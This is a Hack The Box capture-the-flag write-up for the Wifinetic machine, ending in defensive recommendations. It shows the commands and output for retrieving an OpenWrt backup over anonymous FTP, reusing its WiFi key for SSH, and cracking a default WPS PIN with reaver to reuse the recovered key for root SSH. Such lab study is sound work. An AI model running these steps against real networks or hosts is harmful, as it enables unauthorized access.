---
title: "Wifinetic: Backup Exposure, Credential Reuse, and WPS Escalation"
description: "Anonymous FTP exposes an OpenWrt backup containing a wireless key reused for SSH access; a raw-packet-capable reaver and a default WPS PIN recover a WPA key that grants root SSH."
type: case-study
platform: Hack The Box
content_type: machine
status: published-ready
addedAt: "2026-09-14"
tags:
  - linux
  - wifi
  - wps
  - credential-reuse
---

## Summary

This Hack The Box Linux lab chained anonymous FTP exposure, credential reuse, and WPS weaknesses. Sensitive target identifiers and credentials are replaced with role-based placeholders. The notes report that an exposed OpenWrt backup supplied initial SSH access and that a second recovered wireless key supplied root SSH access.

## Context and Objective

Recorded enumeration identified FTP, SSH, and DNS services. The notes describe a virtualized WiFi environment with an access point, managed client, and monitor-mode interface. Objective: assess documented paths from exposed backup data to user- and root-level access in this lab.

## Approach and Evidence

### Service Enumeration

**Observation.** Recorded service discovery showed FTP, SSH, and DNS.

**Action.** The notes used targeted version and default-script scanning.

```bash
nmap -sV -sC -p21,22,53 <TARGET_IP>
```

```
21/tcp open  ftp  vsftpd 3.0.3
22/tcp open  ssh  OpenSSH 8.2p1 Ubuntu
53/tcp open  dns  tcpwrapped
```

**Technical significance.** FTP was relevant because anonymous access exposed a backup archive. **Result.** The notes report that FTP became initial entry path.

### Backup Review and Initial SSH Access

**Observation.** Anonymous FTP exposed an OpenWrt backup containing wireless configuration and an account entry.

**Action.** The notes retrieved and unpacked archive, then reviewed wireless configuration.

```bash
wget -r ftp://anonymous:anonymous@<TARGET_IP>/
tar -xvf <BACKUP_ARCHIVE>
cat etc/config/wireless
sshpass -p '<ARCHIVE_WIFI_PSK>' ssh <LAB_USER>@<TARGET_IP>
```

```
config wifi-iface '<WIRELESS_INTERFACE>'
        option encryption 'psk'
        option key '<ARCHIVE_WIFI_PSK>'

uid=1000(<LAB_USER>) gid=1000(<LAB_USER>) groups=1000(<LAB_USER>)
```

**Technical significance.** Backup exposure disclosed a wireless pre-shared key; reuse of that value for SSH turned a configuration disclosure into interactive access. **Result.** The notes report successful SSH access as `<LAB_USER>`; recorded identity output supports that access.

### WiFi Capability Review

**Observation.** The notes describe an AP interface, a managed client, and a monitor interface. They also record `reaver` with raw-network capability.

**Action.** Binary capabilities were checked.

```bash
getcap /usr/bin/reaver
```

```
/usr/bin/reaver = cap_net_raw+ep
```

**Technical significance.** `cap_net_raw+ep` permits raw packet operations without SUID, enabling wireless attack tooling for an unprivileged user in this lab. **Result.** Recorded capability output establishes that `reaver` had this capability.

### WPS Recovery and Root SSH Access

**Observation.** The local access point accepted its default WPS PIN, according to the notes.

**Action.** The notes ran `reaver` through monitor interface against local AP, then used recovered WPA key for SSH authentication.

```bash
reaver -i <MONITOR_INTERFACE> -b <AP_BSSID> -vv
sshpass -p '<RECOVERED_WPA_PSK>' ssh root@<TARGET_IP>
```

```
[+] Associated with <AP_BSSID> (ESSID: <SSID>)
[+] Pin cracked in <ELAPSED_TIME>
[+] WPA PSK: '<RECOVERED_WPA_PSK>'

uid=0(root) gid=0(root) groups=0(root)
```

**Technical significance.** Default WPS acceptance exposed a second wireless key; reuse of that distinct key for root SSH authentication extended access to root. **Result.** The notes report root SSH access; recorded identity output supports that result.

## Challenges and Decisions

No obstacle, failed attempt, or tradeoff is documented. The notes present a direct chain from exposed backup through credential reuse and WPS recovery; no additional troubleshooting claim is made.

## Outcome

The notes report full lab compromise through two credential-reuse stages: archive wireless key to user SSH access, then recovered WPA key to root SSH access. Recorded identity outputs support both access levels. The notes do not provide independent validation beyond recorded command output.

## Lessons and Recommendations

- **Recommendation:** Do not expose backup archives through anonymous services; wireless configuration can contain credential material.
- **Recommendation:** Keep wireless keys distinct from account passwords to prevent cross-service reuse.
- **Recommendation:** Disable WPS where unnecessary and do not retain default PINs.
- **Recommendation:** Audit file capabilities, including `cap_net_raw`, alongside SUID/SGID permissions.

## References

- Hack The Box: [Wifinetic](https://app.hackthebox.com/machines/Wifinetic) lab.
